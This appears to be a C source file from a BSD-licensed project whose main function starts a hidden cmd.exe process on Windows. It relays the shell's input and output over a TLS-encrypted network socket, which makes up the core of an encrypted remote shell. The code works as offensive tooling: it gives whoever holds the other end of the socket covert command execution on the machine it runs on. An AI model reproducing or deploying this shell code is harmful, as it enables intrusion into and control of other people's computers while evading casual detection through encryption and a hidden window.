/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "tls.h"
  
DWORD wait_evt (void)
{
  WSANETWORKEVENTS ne;
  u_long           off=0;
  DWORD            e;
  
  // unblock socket
  WSAEventSelect (s, evt[sck_evt], FD_CLOSE | FD_READ);
  
  // wait for some event
  e=WaitForMultipleObjects (evt_cnt, evt, FALSE, timeout);

  WSAEnumNetworkEvents (s, evt[sck_evt], &ne);    
  WSAEventSelect (s, evt[sck_evt], 0);
  
  // block socket
  ioctlsocket (s, FIONBIO, &off);
  
  if (ne.lNetworkEvents & FD_CLOSE) {
    e=-1;
  }
  return e;
}

#define R_PIPE 0
#define W_PIPE 1

void cmd (void) 
{
  SECURITY_ATTRIBUTES sa;
  PROCESS_INFORMATION pi;
  STARTUPINFO         si;
  OVERLAPPED          lap;
  
  HANDLE              in[2], out[2];
  DWORD               p, e;
  
  sa.nLength              = sizeof (SECURITY_ATTRIBUTES);
  sa.lpSecurityDescriptor = NULL;
  sa.bInheritHandle       = TRUE;
  
  evt[stdout_evt = evt_cnt++] = CreateEvent (NULL, TRUE, TRUE, NULL);
  
  if (CreatePipe (&in[R_PIPE], &in[W_PIPE], &sa, 0)) 
  {  
    out[R_PIPE] = CreateNamedPipe ("\\\\.\\pipe\\0", 
        PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE      | PIPE_READMODE_BYTE | PIPE_WAIT, 
        PIPE_UNLIMITED_INSTANCES, 0, 0, 0, &sa);
        
    if (out[R_PIPE] != INVALID_HANDLE_VALUE) 
    {  
      out[W_PIPE] = CreateFile ("\\\\.\\pipe\\0", GENERIC_WRITE, 
          0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
      
      if (out[W_PIPE] != INVALID_HANDLE_VALUE) 
      {
        ZeroMemory (&si, sizeof (si));
        ZeroMemory (&pi, sizeof (pi));

        SetHandleInformation (in[W_PIPE], HANDLE_FLAG_INHERIT, 0);
        SetHandleInformation (out[R_PIPE], HANDLE_FLAG_INHERIT, 0);
        
        si.cb              = sizeof (si);
        si.hStdInput       = in[R_PIPE];
        si.hStdError       = out[W_PIPE];
        si.hStdOutput      = out[W_PIPE];
        si.dwFlags         = STARTF_USESTDHANDLES;
        
        if (CreateProcess (NULL, "cmd", NULL, NULL, TRUE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) 
        {
          evt[proc_evt = evt_cnt++] = pi.hProcess;
          
          ZeroMemory (&lap, sizeof (lap));       
          lap.hEvent = evt[stdout_evt];
          
          p=0;
          
          do 
          {
            e=wait_evt();

            if (e==ctrl_evt) {
              printf ("  [ CTRL+C received\n");
              break;
            }
            if (e==proc_evt) {
              printf ("  [ cmd.exe terminated\n");
              break;
            }
            
            if (e == -1) break;

            // is this socket event?
            if (e == sck_evt) 
            {
              if (tls_recv () != SEC_E_OK) 
                break;
              
              WriteFile (in[W_PIPE], pbDataIn, cbDataIn, &cbDataIn, 0);
              p--;  // we're ready to read again.              
            } else
           
            // data from cmd.exe?
            if (e == stdout_evt) 
            {
              if (p==0)  // still waiting for previous read to complete?
              {
                if (!ReadFile (out[R_PIPE], pbDataOut, cbBufferLen, &cbDataOut, &lap))
                {
                  if (GetLastError() != ERROR_IO_PENDING)
                  {
                    // problem...
                    break;
                  } else {
                    p++;
                  }
                } else {
                  p++;
                }
              } else {
                if (!GetOverlappedResult (out[R_PIPE], &lap, &cbDataOut, FALSE)) {
                  // problem...
                  break;
                }
                if (cbDataOut != 0)
                {
                  if (ssl_send() != SEC_E_OK) 
                    break;
                  p--;
                }
              }
            }
          } while (1);
          
          TerminateProcess (pi.hProcess, 0);
          
          CloseHandle (pi.hThread);
          CloseHandle (pi.hProcess);
          evt_cnt--;
        }
        CloseHandle (out[W_PIPE]);
      }
      CloseHandle (out[R_PIPE]);
    }
    CloseHandle (in[W_PIPE]);
    CloseHandle (in[R_PIPE]);
  }
  CloseHandle (evt[stdout_evt]);
  evt_cnt--;
}
